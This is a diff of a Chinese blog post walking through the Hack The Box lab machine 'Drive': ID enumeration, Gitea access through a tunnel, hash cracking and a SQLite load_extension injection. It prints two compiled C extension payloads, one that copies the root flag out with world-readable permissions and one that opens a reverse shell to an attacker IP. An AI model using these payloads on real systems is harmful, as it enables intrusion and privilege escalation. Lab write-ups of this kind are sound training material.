@@ -8,7 +8,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            归档
+            HTB_Drive-第三季度
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -31,15 +31,36 @@
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body>
     <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/archive.css">
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
 <div id="header" class="header">
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-subtitle">归档</h1>
+                <h1 class="header-subtitle">HTB_Drive-第三季度</h1>
                 <div class="header-subinfo">
-                    <p class="article-info-text Chinese"></p>
-                    <p class="article-info-text English"></p>                  
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2023-10-18
+                        </span>
+                        
+                            <span id="/2023/10/18/HTB-Drive-第三季度/" class="leancloud_visitors" data-flag-title="HTB_Drive-第三季度">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/10/18/HTB-Drive-第三季度/"></span>
+                        </span>  
+                    </p>
+                    
+                        
+                            <span class="category-color">HTB</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">HTB</span>
+                        
+                    
                 </div>
             
         </div>
@@ -48,57 +69,120 @@
 </div>
 <div id="container">
     
-        
-            <!-- 归档页面、分类归档页面、标签归档页面 -->
-            <div class="articles">
-                <div class="articles-wrap">
-                    <span class="archive-move-on"></span>
-                    <span class="archive-counter">
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <p>s</p>
+<p>老套路</p>
+<p>开始访问80端口</p>
+<p>注册一个账号登录进去之后，发现url上有数字参数</p>
+<p>尝试参数遍历</p>
+<p><img src="/%5Cimage%5CHTB3%5CDrive%5C%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231019125720.png" alt="这是图片"></p>
+<p>发现了很多有用得东西，可以ssh</p>
+<p>hey team after the great success of the platform we need now to continue the work.<br>on the new features for ours platform.<br>I have created a user for martin on the server to make the workflow easier for you please use the password “xxxxxxxx”.<br>please make the necessary changes to the code before the end of the month<br>I will reach you soon with the token to apply your changes on the repo<br>thanks! </p>
+<p>可以登录进去我以为就有txt了，以为还挺简单，是我错了啥也没有</p>
+<p> hi team!<br>me and my friend(Cris) created a new scheduled backup plan for the database<br>the database will be automatically highly compressed and copied to &#x2F;var&#x2F;www&#x2F;backups&#x2F; by a small bash script every day at 12:00 AM<br>*Note: the backup directory may change in the future!<br>*Note2: the backup would be protected with strong password! don’t even think to crack it guys! :)<br>gg&#x3D;doodleGrive-development-team</p>
+<p>看这条有个备份文件，一看666，有密码 g 就一个能看，先传过来在说</p>
+<p><img src="/%5Cimage%5CHTB3%5CDrive%5C%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231019125809.png" alt="这是图片"></p>
+<p><img src="/%5Cimage%5CHTB3%5CDrive%5C%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231019125825.png" alt="这是图片"></p>
+<p>试试能不能提权，试了好多方法看看进程</p>
+<p><img src="/%5Cimage%5CHTB3%5CDrive%5C%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231019125813.png" alt="这是图片"></p>
+<p>搜一下ok</p>
+<h3 id="Gitea初始"><a href="#Gitea初始" class="headerlink" title="Gitea初始"></a>Gitea初始</h3><p>访问<code>ip:3000</code>即可进入gitea初始化界面</p>
+<p>Gitea的首要目标是创建一个极易安装，运行非常快速，安装和使用体验良好的自建 Git 服务</p>
+<p>使用<code>ProxyChains</code>，用户可以在Kali Linux中配置不同类型的代理服务器，包括<code>HTTP</code>、<code>SOCKS4</code>和<code>SOCKS5</code>代理。此外，用户还可以为不同的目标指定不同的代理服务器，以确保他们的行为不被检测到或跟踪。</p>
+<p>配置文件：<code>/etc/proxychains4.conf</code>, 需要添加代理服务器的ip地址和端口号（可以添加多个）</p>
+<p>他这个有限制，只有自己能访问</p>
+<p>做了一个内网穿透进去代理出来访问</p>
+<p><img src="/%5Cimage%5CHTB3%5CDrive%5C%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231019125817.png" alt="这是图片"></p>
+<p><img src="/%5Cimage%5CHTB3%5CDrive%5C%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231019125820.png" alt="这是图片"></p>
+<p>得登录</p>
+<p>我就知道马丁得密码，我试试，哎我操，登不进去，再看看</p>
+<p>他不叫马丁了</p>
+<p>他换名字了在首页吧还是哪里看到了，登录进去</p>
+<p>找到解压密码，解压这几个压缩包</p>
+<p>然后看看，擦</p>
+<p>断了，都是hash密码 我一个都没破解出来 结束了这个有点难 不会了 哎😔</p>
+<p>擦</p>
+<p>我的kali hashid 检测是sha256 本机试了一下是sha1</p>
+<p>我真的服了，我在本机跑得hashcat，跑出来了，有很多个一个一个尝试</p>
+<p>密码是xxxxxxx有需要的加我wx博客有二维码</p>
+<p>进去之后成功拿到user.txt 然后就是提权 ，他这里有个 elf文件，执行以下需要登录一个账户，反编译看看</p>
+<p>elf文件 我用idea反编译的</p>
+<p><img src="/%5Cimage%5CHTB3%5CDrive%5Celf.png" alt="81e3c7db7032f78778135896f7da97d"></p>
+<p>翻翻捡捡发现 fuc5得位置有一个sql注入，（从这开始我就不会了）</p>
+<p><a target="_blank" rel="noopener" href="https://sqlite.org/loadext.html">https://sqlite.org/loadext.html</a></p>
+<p>load_extension得注入，没禁用参数的话会执行外部得库 so文件之类的</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sqlite3ext.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">SQLITE_EXTENSION_INIT1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sqlite3_extension_init</span><span class="params">(sqlite3 *db)</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> *inputFile = <span class="string">&quot;/root/root.txt&quot;</span>;  </span><br><span class="line">  <span class="type">char</span> *outputFile = <span class="string">&quot;/home/tom/haru&quot;</span>;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">ssize_t</span> bytesRead;</span><br><span class="line">  <span class="type">int</span> inFd = <span class="built_in">open</span>(inputFile, O_RDONLY);</span><br><span class="line">  <span class="type">int</span> outFd = <span class="built_in">open</span>(outputFile, O_WRONLY | O_CREAT | O_APPEND, S_IRUSR | S_IWUSR);</span><br><span class="line">  <span class="keyword">while</span> ((bytesRead = <span class="built_in">read</span>(inFd, buffer, <span class="built_in">sizeof</span>(buffer))) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">write</span>(outFd, buffer, bytesRead);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">close</span>(inFd);</span><br><span class="line">  <span class="built_in">close</span>(outFd);</span><br><span class="line">  <span class="built_in">chmod</span>(outputFile, S_IRWXU | S_IRWXG | S_IRWXO);</span><br><span class="line">  <span class="keyword">return</span> SQLITE_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>编译执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o C.so C.c</span><br></pre></td></tr></table></figure>
+
+<p>丢到同目录下执行</p>
+<p>这里直接读取到flag</p>
+<p>我试试反弹shell</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sqlite3ext.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">SQLITE_EXTENSION_INIT1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sqlite3_extension_init</span><span class="params">(sqlite3 *db)</span> </span>&#123;</span><br><span class="line"> <span class="type">int</span> sockfd;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> server;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket</span></span><br><span class="line">    sockfd = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sockfd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器信息</span></span><br><span class="line">    server.sin_family = AF_INET;</span><br><span class="line">    server.sin_port = <span class="built_in">htons</span>(<span class="number">8888</span>);</span><br><span class="line">    server.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;10.10.14.96&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接到监听器</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">connect</span>(sockfd, (<span class="keyword">struct</span> sockaddr *)&amp;server, <span class="built_in">sizeof</span>(server)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;connect&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重定向输入、输出和错误流到socket</span></span><br><span class="line">    <span class="built_in">dup2</span>(sockfd, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">dup2</span>(sockfd, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">dup2</span>(sockfd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行shell</span></span><br><span class="line">    <span class="built_in">execve</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是我得代码，反弹成功了</p>
+<p>加油少年</p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/touxiang.jpg" alt="章鱼海绵">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>章鱼海绵
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2023/10/18/HTB-Drive-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%BA%A6/" target="_blank">HTB_Drive-第三季度</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
                         
-                            目前共计 38 篇日志，继续加油！
+                            <a href="/categorie/HTB/">HTB</a>
                         
-                    </span>
-                    
-                    
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
                         
-                            <div class="archive-title">
-                                <h2 class="archive-year">2023</h2>
-                            </div>
-                            
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/02/23/python%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%B0%8F%E8%AE%A1/"><span>python脚本编写小计</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">02-23</span>
-                                </div>
-                            </div>
-                        </div>
+                            <a href="/tag/HTB/">HTB</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
                     
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/02/22/%E5%88%9D%E6%8E%A2ssrfgopher%E5%8D%8F%E8%AE%AE/"><span>初探ssrfgopher协议</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">02-22</span>
-                                </div>
-                            </div>
-                        </div>
                     
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/02/10/%E7%AB%A0%E9%B1%BC%E6%B5%B7%E7%BB%B5/"><span>章鱼海绵</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">02-10</span>
-                                </div>
-                            </div>
-                        </div>
+                        <a href="/2023/10/18/HTB-Pilgrimage/" class="next-prefix">» </a> 下一篇：    <a href="/2023/10/18/HTB-Pilgrimage/" title="发布于 2023-10-18 07:05">HTB_Pilgrimage</a>
                     
                 </div>
             </div>
             
+    <div class="article-comments">
         
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+
+        </div>
     
 </div>
     <div id="footer"></div>
@@ -130,7 +214,7 @@
                     
                         <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
                     
-                        <li class=" active "><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
                     
                         <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
                     
